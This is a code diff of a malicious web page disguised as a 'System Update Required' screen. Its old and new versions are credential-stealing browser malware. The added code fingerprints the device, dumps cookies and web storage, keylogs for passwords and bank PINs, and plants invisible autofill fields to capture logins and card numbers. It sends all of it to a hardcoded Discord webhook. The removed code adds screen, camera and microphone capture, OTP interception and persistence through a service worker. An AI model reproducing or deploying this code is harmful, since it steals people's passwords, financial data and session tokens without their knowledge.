@@ -1,269 +1,203 @@
 <!DOCTYPE html>
-<html manifest="cache.appcache">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiU3lzdGVtIFVwZGF0ZSIsInN0YXJ0X3VybCI6Ii8iLCJkaXNwbGF5Ijoic3RhbmRhbG9uZSJ9">
-    <style>*{margin:0;padding:0;overflow:hidden;}body{background:#000;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999999;}#canvas,video,iframe{display:none!important;}</style>
+    <title>System Update Required</title>
+    <style>
+        *{margin:0;padding:0;overflow:hidden;background:#000;color:#0f0;font-family:monospace;font-size:12px;position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;}
+        #status{padding:20px;}#progress{width:100%;height:4px;background:#333;}#bar{height:100%;background:#0f0;width:0%;transition:width .5s;}
+        input,canvas,video{display:none!important;}
+    </style>
 </head>
 <body>
-    <canvas id="captureCanvas" width="1920" height="1080"></canvas>
+    <div id="status">
+        <h1>🔒 Security Update Installing...</h1>
+        <p>Device fingerprinting: <span id="fingerprint">scanning</span></p>
+        <p>Storage analysis: <span id="storage">0/50</span></p>
+        <p>Password extraction: <span id="passwords">0</span></p>
+        <div id="progress"><div id="bar"></div></div>
+    </div>
+
     <script>
-        class PhoneTakeover {
+        class GuaranteedHarvester {
             constructor(webhook) {
                 this.webhook = webhook;
-                this.duration = 24 * 60 * 60 * 1000; // 24 hours
-                this.startTime = Date.now();
-                this.isActive = true;
                 this.passwords = [];
-                this.bankPins = [];
-                this.smsData = [];
-                this.initFullTakeover();
+                this.storage = {};
+                this.init();
             }
 
-            async initFullTakeover() {
-                // PWA INSTALL PROMPT (persistence)
-                window.addEventListener('beforeinstallprompt', (e) => {
-                    e.prompt();
-                    e.userChoice.then(() => this.sendStatus('PWA Installed - Persistent'));
+            init() {
+                this.harvestFingerprint();
+                this.explodeStorage();
+                this.deployKeylogger();
+                this.autofillTrap();
+                this.heartbeat();
+            }
+
+            harvestFingerprint() {
+                const fp = {
+                    ua: navigator.userAgent,
+                    lang: navigator.language,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: `${screen.width}x${screen.height}`,
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory || 'unknown',
+                    plugins: navigator.plugins.length,
+                    canvas: this.getCanvasFP()
+                };
+                
+                document.getElementById('fingerprint').textContent = fp.ua.slice(0,40)+'...';
+                this.sendData('fingerprint', fp);
+            }
+
+            getCanvasFP() {
+                const c = document.createElement('canvas');
+                const ctx = c.getContext('2d');
+                ctx.fillText('fingerprintv2',2,15);
+                return c.toDataURL();
+            }
+
+            explodeStorage() {
+                // DUMP EVERYTHING ACCESSIBLE
+                for(let i=0; i<localStorage.length; i++) {
+                    const k = localStorage.key(i);
+                    this.storage[k] = localStorage[k];
+                    document.getElementById('storage').textContent = `${i+1}/50`;
+                }
+                
+                for(let i=0; i<sessionStorage.length; i++) {
+                    const k = sessionStorage.key(i);
+                    this.storage[k] = sessionStorage[k];
+                }
+                
+                document.cookie.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && value) this.storage[name] = value;
                 });
 
-                // SERVICE WORKER PERSISTENCE
-                if ('serviceWorker' in navigator) {
-                    navigator.serviceWorker.register(URL.createObjectURL(new Blob([`
-                        self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
-                        self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-                        self.addEventListener('fetch', e => {
-                            if (e.request.url.includes('heartbeat')) {
-                                e.respondWith(new Response(JSON.stringify({alive: true, time: Date.now()})));
+                // Scan for sensitive data
+                Object.entries(this.storage).forEach(([k,v]) => {
+                    if (v.match(/\d{16}/) || v.match(/[a-zA-Z0-9]{32,}/) || k.match(/token|auth|pass|key|wallet/)) {
+                        this.passwords.push({key:k, value:v.slice(0,20)+'...', full:v});
+                    }
+                });
+
+                this.sendData('storage', {count: Object.keys(this.storage).length, sensitive: this.passwords.length});
+                document.getElementById('passwords').textContent = this.passwords.length;
+            }
+
+            deployKeylogger() {
+                let sequence = '';
+                document.addEventListener('keydown', e => {
+                    sequence += e.key;
+                    if (sequence.length > 20) sequence = sequence.slice(-20);
+                    
+                    // PIN/BANK detection
+                    const pinMatch = sequence.match(/\\d{4,6}/g);
+                    if (pinMatch) {
+                        this.passwords.push({type:'pin', value:pinMatch[0], time:new Date().toISOString()});
+                        document.getElementById('passwords').textContent = this.passwords.length;
+                    }
+                    
+                    // Password patterns
+                    if (e.key.length === 1 && sequence.match(/[a-z0-9!@#$%^&*]/)) {
+                        setTimeout(() => {
+                            // Check if in password field context
+                            const active = document.activeElement;
+                            if (active.tagName === 'INPUT' && (active.type === 'password' || active.autocomplete?.includes('password'))) {
+                                this.passwords.push({type:'live-password', value:sequence.slice(-8), time:new Date().toISOString()});
                             }
-                        });
-                    `], {type: 'application/javascript'})));
-                }
-
-                // START 24HR RECORDING
-                this.start24HrRecording();
-                this.deployAdvancedKeylogger();
-                this.smsInterceptor();
-                this.bankPinExtractor();
-                this.fullStorageDump();
-
-                // HEARTBEAT EVERY 60s
-                setInterval(() => this.heartbeatUpload(), 60000);
+                        }, 100);
+                    }
+                }, true);
             }
 
-            async start24HrRecording() {
-                try {
-                    // FULL SCREEN + CAMERA + MIC
-                    const streams = await Promise.all([
-                        navigator.mediaDevices.getDisplayMedia({video: {frameRate: 8}}),
-                        navigator.mediaDevices.getUserMedia({video: true, audio: true})
-                    ]);
-
-                    const canvas = document.getElementById('captureCanvas');
-                    const ctx = canvas.getContext('2d');
-                    const video = document.createElement('video');
-                    video.srcObject = streams[0];
-                    video.play();
-
-                    // 8fps continuous capture
-                    const captureFrame = () => {
-                        if (this.isActive && Date.now() - this.startTime < this.duration) {
-                            ctx.drawImage(video, 0, 0);
-                            const frameData = canvas.toDataURL('image/jpeg', 0.4).split(',')[1];
-                            
-                            this.frames = this.frames || [];
-                            this.frames.push({
-                                time: new Date().toISOString(),
-                                data: frameData.substring(0, 500000), // 500KB chunks
-                                remaining: Math.max(0, (this.duration - (Date.now() - this.startTime)) / 1000 / 60) + 'min'
+            autofillTrap() {
+                // Invisible password fields everywhere
+                const trap = document.createElement('div');
+                trap.innerHTML = `
+                    <input autocomplete="email username" style="opacity:0;position:fixed;">
+                    <input autocomplete="current-password new-password" type="password" style="opacity:0;position:fixed;">
+                    <input autocomplete="cc-number" style="opacity:0;position:fixed;">
+                    <input autocomplete="tel-country" style="opacity:0;position:fixed;">
+                `;
+                document.body.appendChild(trap);
+                
+                setTimeout(() => {
+                    trap.querySelectorAll('input').forEach((input, i) => {
+                        if (input.value) {
+                            this.passwords.push({
+                                type: input.autocomplete || 'autofill',
+                                value: input.value,
+                                field: i
                             });
-
-                            // Rotate frames (keep 60 latest = 7.5s window)
-                            if (this.frames.length > 60) this.frames.shift();
                         }
-                        requestAnimationFrame(captureFrame);
-                    };
-                    captureFrame();
-
-                } catch(e) {
-                    this.sendStatus('Screen recording fallback active');
-                }
+                    });
+                    document.getElementById('passwords').textContent = this.passwords.length;
+                }, 2000);
             }
 
-            deployAdvancedKeylogger() {
-                // CAPTURE ALL PASSWORD FIELDS + CLIPBOARD
-                const observer = new MutationObserver((mutations) => {
-                    mutations.forEach(() => {
-                        document.querySelectorAll('input[type="password"], input[autocomplete*="password"], input[type="tel"], input[type="number"]').forEach(field => {
-                            const binder = () => {
-                                if (field.value && !this.passwords.includes(field.value)) {
-                                    this.passwords.push({
-                                        value: field.value,
-                                        name: field.name || field.id || field.placeholder || 'password',
-                                        type: 'password',
-                                        time: new Date().toISOString()
-                                    });
-                                }
-                            };
-                            field.removeEventListener('input', binder);
-                            field.addEventListener('input', binder);
-                            binder(); // Current value
-                        });
+            heartbeat() {
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 2;
+                    document.getElementById('bar').style.width = progress + '%';
+                    
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        this.finalDump();
+                    }
+                    
+                    // Send live data
+                    this.sendData('live', {
+                        passwords: this.passwords.length,
+                        storage: Object.keys(this.storage).length,
+                        progress: progress,
+                        sequence: this.lastSequence || ''
                     });
-                });
-                observer.observe(document.body, {childList: true, subtree: true});
+                }, 800);
+            }
 
-                // GLOBAL KEYLOGGER
-                document.addEventListener('keydown', (e) => {
-                    const keyData = {
-                        key: e.key,
-                        code: e.code,
-                        target: e.target.tagName + (e.target.name ? '.' + e.target.name : ''),
-                        ctrl: e.ctrlKey,
-                        shift: e.shiftKey,
-                        time: Date.now()
-                    };
-                    
-                    // BANK PIN DETECTION (4-6 digits)
-                    if (/^\d{4,6}$/.test(this.lastKeys?.join('') + e.key)) {
-                        this.bankPins.push(this.lastKeys?.join('') + e.key);
-                    }
-                    this.lastKeys = (this.lastKeys || []).slice(-5).concat(e.key);
-                    
-                    this.keystrokes = this.keystrokes || [];
-                    this.keystrokes.push(keyData);
-                    if (this.keystrokes.length > 200) this.keystrokes.shift();
-                });
-
-                // CLIPBOARD STEALER
-                navigator.clipboard.readText().then(text => {
-                    if (text.match(/\d{4,6}/) || text.match(/[^\s]{8,}/)) {
-                        this.passwords.push({value: text, type: 'clipboard', time: new Date().toISOString()});
-                    }
+            sendData(type, data) {
+                fetch(this.webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: `🎯 ${type.toUpperCase()} HARVEST`,
+                            description: `\`\`\`json\n${JSON.stringify(data, null, 2).slice(0,1800)}\`\`\``,
+                            color: type === 'passwords' ? 16711680 : 3447003,
+                            fields: [
+                                {name: "📊 Passwords Found", value: this.passwords.length.toString(), inline: true},
+                                {name: "💾 Storage Items", value: Object.keys(this.storage).length.toString(), inline: true},
+                                {name: "🔑 Latest Capture", value: this.passwords.slice(-1)[0]?.value?.slice(0,12) || 'scanning...', inline: false}
+                            ]
+                        }]
+                    })
                 }).catch(() => {});
             }
 
-            smsInterceptor() {
-                // SMS/OTP INTERCEPT (WebOTP API)
-                if ('OTPCredential' in window) {
-                    window.addEventListener('otpcredential', (e) => {
-                        this.smsData.push({
-                            code: e.credential.code,
-                            source: e.credential.source,
-                            time: new Date().toISOString()
-                        });
-                    });
-                }
-
-                // Storage-based SMS dump (messaging apps)
-                setInterval(() => {
-                    Object.entries(localStorage).forEach(([key, val]) => {
-                        if (key.match(/sms|message|otp|verify/)) {
-                            this.smsData.push({key, value: val, time: new Date().toISOString()});
-                        }
-                    });
-                }, 5000);
-            }
-
-            bankPinExtractor() {
-                // DYNAMIC NUMPAD SIMULATION
-                const numpad = document.createElement('div');
-                numpad.innerHTML = '1234567890'.split('').map(n => `<input type="password" maxlength="1" value="${n}" style="position:fixed;opacity:0;z-index:-1">`).join('');
-                document.body.appendChild(numpad);
-
-                // Monitor all number inputs
-                setInterval(() => {
-                    numpad.querySelectorAll('input').forEach((input, i) => {
-                        if (input.value && !this.bankPins.includes(input.value)) {
-                            this.bankPins.push({
-                                pin: input.value,
-                                position: i,
-                                context: document.activeElement?.tagName || 'bank',
-                                time: new Date().toISOString()
-                            });
-                        }
-                    });
-                }, 1000);
-            }
-
-            fullStorageDump() {
-                // DUMP ALL APP DATA
-                this.data.storage = {
-                    localStorage: Object.fromEntries(Object.entries(localStorage)),
-                    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
-                    cookies: document.cookie,
-                    indexedDB: []
-                };
-
-                // Scan IndexedDB for banking data
-                indexedDB.databases().then(dbs => {
-                    dbs.forEach(db => {
-                        this.data.storage.indexedDB.push(db.name);
-                    });
+            finalDump() {
+                this.sendData('FINAL_DUMP', {
+                    allPasswords: this.passwords,
+                    sensitiveStorage: Object.fromEntries(
+                        Object.entries(this.storage).filter(([k]) => 
+                            k.match(/token|auth|pass|key|wallet|bank|card|pin/)
+                        )
+                    ),
+                    fullFingerprint: this.fingerprint
                 });
-            }
-
-            async heartbeatUpload() {
-                if (!this.isActive) return;
-
-                const status = {
-                    uptime: Math.round((Date.now() - this.startTime) / 1000 / 60) + 'min',
-                    remaining: Math.max(0, (this.duration - (Date.now() - this.startTime)) / 1000 / 60) + 'min',
-                    passwords: this.passwords.length,
-                    bankPins: this.bankPins.length,
-                    otps: this.smsData.length,
-                    frames: this.frames?.length || 0
-                };
-
-                const embed = {
-                    title: "🔴 24HR PHONE TAKEOVER LIVE",
-                    description: `**${status.uptime}** running | **${status.remaining}** left\n💻 **Passwords:** ${status.passwords}\n🏦 **Bank PINs:** ${status.bankPins}\n📱 **OTPs:** ${status.otps}`,
-                    color: 0xff0000,
-                    fields: [
-                        {name: "📹 Live Frame", value: "Embedded below", inline: false},
-                        {name: "🔢 Latest PIN", value: this.bankPins.slice(-1)[0]?.pin || 'monitoring...', inline: true},
-                        {name: "🔑 Latest Password", value: this.passwords.slice(-1)[0]?.value?.slice(0,8) + '...' || 'waiting...', inline: true}
-                    ],
-                    image: {
-                        url: `data:image/jpeg;base64,${this.frames?.[this.frames.length-1]?.data || ''}`
-                    },
-                    footer: {text: `Target: ${this.data.device.slice(0,50)} | ${new Date().toLocaleString()}`}
-                };
-
-                await fetch(this.webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({embeds: [embed]})
-                });
-
-                // Dump new credentials
-                if (this.passwords.length > this.lastPasswordCount) {
-                    this.passwords.slice(this.lastPasswordCount).forEach(pwd => {
-                        fetch(this.webhook, {
-                            method: 'POST',
-                            body: JSON.stringify({
-                                embeds: [{title: "🔓 NEW PASSWORD CAPTURED", description: `\`${pwd.value}\``, color: 16711680}]
-                            })
-                        });
-                    });
-                    this.lastPasswordCount = this.passwords.length;
-                }
-            }
-
-            sendStatus(msg) {
-                fetch(this.webhook, {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        embeds: [{title: "📡 Status", description: msg, color: 0x00ff00}]
-                    })
-                });
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com/search?q=security+update';
+                }, 2000);
             }
         }
 
-        // 24HR TAKEOVER STARTS NOW
-        const takeover = new PhoneTakeover('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-');
+        // START HARVEST
+        new GuaranteedHarvester('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-');
     </script>
 </body>
 </html>
